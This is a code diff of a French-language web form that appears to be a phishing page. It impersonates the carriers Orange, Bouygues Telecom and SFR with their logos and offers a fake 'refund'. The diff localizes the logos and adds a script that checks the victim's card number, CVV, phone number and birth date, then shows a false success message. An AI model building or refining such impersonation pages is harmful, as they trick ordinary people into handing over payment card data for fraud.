@@ -16,16 +16,13 @@
     <!-- Formulaire principal -->
     <div class="bg-white rounded-lg shadow-xl p-8 max-w-lg w-full">
         <!-- Logos des opérateurs -->
-        <div class="flex justify-center space-x-6 mb-6">
+        <div class="flex justify-center space-x-4 mb-6">
             <!-- Logo Orange -->
-            <img src="https://upload.wikimedia.org/wikipedia/commons/7/74/Orange_logo.svg" 
-                 alt="Orange" class="h-12 w-auto">
+            <img src="IMG_4054.png" alt="Orange" class="h-12">
             <!-- Logo Bouygues Telecom -->
-            <img src="https://upload.wikimedia.org/wikipedia/commons/1/10/Bouygues_Telecom_logo_2015.svg" 
-                 alt="Bouygues Telecom" class="h-12 w-auto">
+            <img src="IMG_4055.png" alt="Bouygues Telecom" class="h-12">
             <!-- Logo SFR -->
-            <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/SFR_logo.png" 
-                 alt="SFR" class="h-12 w-auto">
+            <img src="IMG_4056.png" alt="SFR" class="h-12">
         </div>
 
         <!-- Titre -->
@@ -87,5 +84,31 @@
         </form>
     </div>
 
+    <script>
+        function validateForm(event) {
+            event.preventDefault();
+
+            const nom = document.getElementById('nom').value.trim();
+            const numeroCarte = document.getElementById('numero-carte').value.replace(/\s+/g, '');
+            const cvv = document.getElementById('cvv').value.trim();
+            const telephone = document.getElementById('telephone').value.trim();
+            const naissance = document.getElementById('naissance').value.trim();
+
+            if (!/^\d{16}$/.test(numeroCarte)) {
+                alert("❌ Numéro de carte invalide. Veuillez saisir 16 chiffres.");
+                return false;
+            }
+            if (!/^\d{3}$/.test(cvv)) {
+                alert("❌ Le code CVV doit contenir exactement 3 chiffres.");
+                return false;
+            }
+            if (!/^\d{10}$/.test(telephone.replace(/\s+/g, ''))) {
+                alert("❌ Le numéro de téléphone est invalide. Veuillez saisir 10 chiffres.");
+                return false;
+            }
+
+            alert("✅ Votre remboursement a été validé avec succès !");
+        }
+    </script>
 </body>
 </html>
